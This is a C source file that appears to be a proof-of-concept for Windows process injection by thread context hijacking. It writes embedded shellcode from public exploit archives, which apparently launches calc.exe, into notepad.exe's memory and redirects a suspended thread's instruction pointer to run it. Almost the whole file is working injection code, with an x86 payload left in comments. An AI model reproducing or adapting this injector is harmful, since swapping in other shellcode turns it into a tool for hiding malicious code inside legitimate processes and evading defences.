#include <Windows.h>
#include <TlHelp32.h>

// x86 Payload
// https://packetstormsecurity.com/files/156478/Windows-x86-Null-Free-WinExec-Calc.exe-Shellcode.html
/*unsigned char payload[] =
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
"\x52\xff\xd0";
*/

// x64 payload
// https://www.exploit-db.com/shellcodes/49819
unsigned char payload[] =
"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
"\x48\x83\xec\x20\x41\xff\xd6";

unsigned int payload_len = sizeof(payload);

int main(int argc, char** argv) {

	HANDLE hProcess;
	HANDLE hRemoteThread;
	LPVOID lpTargetAddress;
	DWORD dwProcessId = -1;

	// Take snapshot of all the processes in the system
	HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);

	// Iterate through all processes until desired process is found
	Process32First(snap, &pe);
	do {
		// If desired process is found, break from loop and save PID
		if (!wcscmp(pe.szExeFile, L"notepad.exe")) {
			dwProcessId = pe.th32ProcessID;
			break;
		}
	} while (Process32Next(snap, &pe));

	if (dwProcessId == -1)
		return 1;

	// Take snapshot of all the threads in the system
	HANDLE threadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 te = { sizeof(THREADENTRY32) };
	DWORD tid = 0;

	// Iterate through all threads until the first thread of the target process is found
	Thread32First(threadSnap, &te);
	do {
		// If the thread is in our process, save thread ID to our list
		if (te.th32OwnerProcessID == dwProcessId)
			tid = te.th32ThreadID;
	} while (Thread32Next(threadSnap, &te));

	// If somehow we could not find threads, exit
	if (!tid)
		return 1;

	// Open the target process with required access
	hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, dwProcessId);
	// Allocate as much memory as the payload needs (payload_len) or more
	lpTargetAddress = VirtualAllocEx(hProcess, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (lpTargetAddress == 0)
		return 1;

	// Write the payload to the allocated memory on target process
	WriteProcessMemory(hProcess, lpTargetAddress, payload, payload_len, NULL);

	// Open the target thread with required access
	HANDLE hThread = OpenThread(SYNCHRONIZE | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, tid);

	// Suspend the thread so we can change its context
	SuspendThread(hThread);

	// Get the thread's context and store it in a CONTEXT struct
	CONTEXT context;
	context.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &context))
		return 1;

	// Set the Rip register to our payload's address
	// If the target process is x86, Rip will be Eip
	context.Rip = lpTargetAddress;

	// Set the new context
	if (!SetThreadContext(hThread, &context))
		return 1;
	
	// Resume the thread so our payload executes
	ResumeThread(hThread);

	CloseHandle(hThread);
	CloseHandle(hProcess);

	return 0;
}